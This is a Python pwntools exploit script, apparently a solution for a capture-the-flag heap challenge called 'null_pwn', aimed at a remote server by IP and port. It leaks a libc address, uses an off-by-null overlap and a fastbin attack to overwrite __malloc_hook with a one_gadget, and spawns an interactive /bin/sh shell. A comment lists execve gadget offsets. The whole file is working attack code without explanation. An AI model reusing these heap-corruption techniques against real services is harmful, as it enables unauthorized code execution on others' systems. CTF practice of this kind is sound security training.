from pwn import *
context.log_level = 'debug'

def add(id,size,content):
    p.sendlineafter(":",str(1))
    p.sendlineafter("Index:",str(id))
    p.sendlineafter("Heap :",str(size))
    p.sendafter("?:",content)
def delete(id):
    p.sendlineafter(":",str(2))
    p.sendlineafter("Index:",str(id))
def edit(id,content):
    p.sendlineafter(":",str(3))
    p.sendlineafter("Index:",str(id))
    p.sendafter("?:",content)
def show(id):
    p.sendlineafter(":",str(4))
    p.sendlineafter("Index :",str(id))



p = process("./null_pwn")
p = remote("82.157.5.28",50804)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


add(0,0xf8,'a')
add(1,0x68,'a')
add(2,0xf8,'a')
add(3,0x68,'a') #protect

delete(0)
add(0,0xf8,'\x78')
show(0)
p.recvuntil("Content : ")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libc_base = leak_addr - (0x7fc7c3689b78-0x7fc7c32c5000)
print "libc_base:",hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23
print "malloc_hook:",hex(malloc_hook)

delete(0)
edit(1,'a'*0x60+p64(0x170)+'\x00')
delete(2)

add(0,0xf8,'a')
add(2,0x68,'a')    #1
add(4,0xf8,'a')

delete(1)
delete(3)
delete(2)

add(1,0x68,p64(malloc_hook))
add(2,0x68,p64(malloc_hook))
add(3,0x68,p64(malloc_hook))
add(5,0x68,'\x00'*0x13+p64(libc_base+0xf1247))

'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

#gdb.attach(p)
#raw_input()

p.sendlineafter(":",str(1))
p.sendlineafter("Index:",str(9))
p.sendlineafter("Heap :",str(0x68))

p.interactive()